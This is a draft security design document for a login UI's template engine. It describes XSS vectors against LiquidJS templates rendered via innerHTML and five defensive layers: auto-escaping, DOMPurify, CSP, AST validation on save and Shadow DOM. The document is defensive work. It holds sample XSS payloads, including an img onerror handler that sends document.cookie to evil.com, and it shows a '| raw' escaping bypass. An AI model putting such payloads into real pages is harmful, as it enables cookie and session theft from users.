# Flow Engine — Template Security Model

> **Status:** Draft
> **See also:** [Flow Engine Guide](flow-engine-guide.md) · [Step Response Shape](flow-engine-nodes.md)

Rendering user-controlled or admin-controlled LiquidJS templates via `innerHTML` introduces a critical attack surface. This document covers the known vectors and the defense-in-depth mitigations.

## Attack Vectors

### 1. Payload Injection (backend → template)

An attacker attempts to manipulate a capability value (field name, text_key, or pre-filled value) to contain malicious HTML:

```json
{ "name": "email", "text_key": "<img src=x onerror=alert(1)>", "type": "email" }
```

**Mitigation:** LiquidJS **auto-escapes all `{{ }}` output by default** (since v10). The above renders as the harmless string `&lt;img src=x onerror=alert(1)&gt;`. No script execution occurs. This protection is active as long as the template uses standard `{{ }}` output tags.

### 2. `innerHTML` and inline event handlers

The orchestrator injects rendered HTML via `shadowRoot.innerHTML = html`. Browsers natively block `<script>` tags inserted this way. **However, inline event handlers execute:**

```html
<!-- This WILL execute when injected via innerHTML -->
<img src="x" onerror="fetch('https://evil.com?cookie='+document.cookie)">
```

**Mitigation:** Content Security Policy (see defense-in-depth below).

### 3. Ejected custom templates (tenant admin)

A malicious or compromised org admin "ejects" the master template and injects a persistent XSS payload:

```liquid
<!-- Malicious ejected template -->
<div class="login-card">
  <img src="x" onerror="steal(document.cookie)">
  {% for field in fields %}
    <zl-field name="{{ field[0] }}"></zl-field>
  {% endfor %}
</div>
```

**Trust boundary:** The admin who ejects the template already has full control over branding, SSO provider configuration, and user schemas. Injecting XSS into their own org's login page is self-harm. In single-tenant or self-hosted deployments, this is acceptable. In multi-tenant SaaS, this requires isolation guarantees (see mitigations).

### 4. Translation dictionary injection

A tenant provides custom translations containing HTML:

```json
{ "identifier.title": "<img src=x onerror='alert(1)'>" }
```

**Mitigation:** The `| t` filter returns a plain string. Because it is used inside `{{ }}`, LiquidJS auto-escapes the output. Safe by default.

### 5. The `| raw` filter bypass

LiquidJS provides a `| raw` filter that disables auto-escaping:

```liquid
<!-- This bypasses all auto-escaping -->
{{ malicious_value | raw }}
```

**Mitigation:** The `| raw` filter must be **banned from all tenant-editable templates**. The built-in `default.liquid` must never use it. On template save, the backend must parse the Liquid AST and reject templates containing `raw` filter usage.

## Defense-in-Depth Strategy

```
┌─────────────────────────────────────────────────────┐
│  Layer 1: LiquidJS Auto-Escaping                    │
│  All {{ }} output is HTML-escaped by default.       │
│  Neutralizes payload injection from backend values. │
├─────────────────────────────────────────────────────┤
│  Layer 2: DOMPurify Sanitization                    │
│  Before innerHTML assignment, the rendered HTML     │
│  string is passed through DOMPurify to strip        │
│  dangerous tags and attributes (onerror, onclick).  │
├─────────────────────────────────────────────────────┤
│  Layer 3: Content Security Policy (CSP)             │
│  The Hosted Login page sets:                        │
│    script-src 'self';                               │
│    style-src 'self' 'unsafe-inline';                │
│  This makes ALL inline event handlers inert,        │
│  even if they survive sanitization.                 │
├─────────────────────────────────────────────────────┤
│  Layer 4: Template Validation on Save               │
│  On ejected template save, the backend parses the   │
│  Liquid AST and rejects:                            │
│    - Any use of the | raw filter                    │
│    - <script> tags                                  │
│    - Inline event attributes (on*)                  │
│    - Tags outside the <zl-*> + safe HTML whitelist  │
├─────────────────────────────────────────────────────┤
│  Layer 5: Shadow DOM Style Isolation                │
│  The <zitadel-login> Shadow DOM prevents            │
│  customer-page CSS from interfering with the login  │
│  UI. Note: Shadow DOM does NOT provide script       │
│  isolation — CSP handles that.                      │
└─────────────────────────────────────────────────────┘
```

## Summary

| Vector | Primary Mitigation | Fallback |
|---|---|---|
| Backend payload values | LiquidJS auto-escaping | DOMPurify |
| `innerHTML` inline handlers | CSP `script-src 'self'` | DOMPurify strips `on*` attributes |
| Ejected template XSS | Template AST validation on save | CSP + DOMPurify |
| Translation dictionary HTML | LiquidJS auto-escaping (via `{{ }}`) | DOMPurify |
| `| raw` filter abuse | AST validation rejects on save | CSP as last resort |

**The strongest single mitigation is CSP.** A strict `script-src 'self'` header on the Hosted Login page makes all inline script vectors completely inert regardless of whether the HTML was sanitized. Combined with LiquidJS auto-escaping and DOMPurify, this creates three independent layers that an attacker must defeat simultaneously.
